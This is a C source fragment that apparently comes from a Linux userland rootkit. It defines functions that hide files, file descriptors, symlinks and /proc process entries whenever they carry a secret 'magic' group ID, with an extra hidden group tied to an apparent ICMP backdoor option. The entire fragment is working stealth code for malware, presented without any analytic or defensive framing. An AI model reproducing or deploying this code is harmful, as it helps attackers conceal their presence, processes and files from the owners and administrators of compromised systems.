int _hidden_path(const char *pathname, short mode){
#ifndef HIDE_SELF
    return 0;
#else
    if(pathname == NULL)
        return 0;

    gid_t magicgid = readgid(),
          pathgid;
    switch(mode){
        case MODE_REG:
            pathgid = get_path_gid(pathname);
            if(pathgid == magicgid)
                return 1;
#ifdef USE_ICMP_BD
            if(pathgid == magicgid-1)
                return 1;
#endif
            break;
        case MODE_64:
            pathgid = get_path_gid64(pathname);
            if(pathgid == magicgid)
                return 1;
#ifdef USE_ICMP_BD
            if(pathgid == magicgid-1)
                return 1;
#endif
            break;
    }

    return 0;
#endif
}

int _f_hidden_path(int fd, short mode){
#ifndef HIDE_SELF
    return 0;
#else

    gid_t magicgid = readgid(),
          pathgid;
    switch(mode){
        case MODE_REG:
            pathgid = get_fd_gid(fd);
            if(pathgid == magicgid)
                return 1;
#ifdef USE_ICMP_BD
            if(pathgid == magicgid-1)
                return 1;
#endif
            break;
        case MODE_64:
            pathgid = get_fd_gid64(fd);
            if(pathgid == magicgid)
                return 1;
#ifdef USE_ICMP_BD
            if(pathgid == magicgid-1)
                return 1;
#endif
            break;
    }

    return 0;
#endif
}

int _l_hidden_path(const char *pathname, short mode){
#ifndef HIDE_SELF
    return 0;
#else
    if(pathname == NULL)
        return 0;

    gid_t magicgid = readgid(),
          pathgid;

    switch(mode){
        case MODE_REG:
            pathgid = lget_path_gid(pathname);
            if(pathgid == magicgid)
                return 1;
#ifdef USE_ICMP_BD
            if(pathgid == magicgid-1)
                return 1;
#endif
            break;
        case MODE_64:
            pathgid = lget_path_gid64(pathname);
            if(pathgid == magicgid)
                return 1;
#ifdef USE_ICMP_BD
            if(pathgid == magicgid-1)
                return 1;
#endif
            break;
    }

    return 0;
#endif
}

int hidden_proc(pid_t pid){
#ifndef HIDE_SELF
    return 0;
#else
    char proc_path[8 + PID_MAXLEN];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
    return _hidden_path(proc_path, MODE_REG);
#endif
}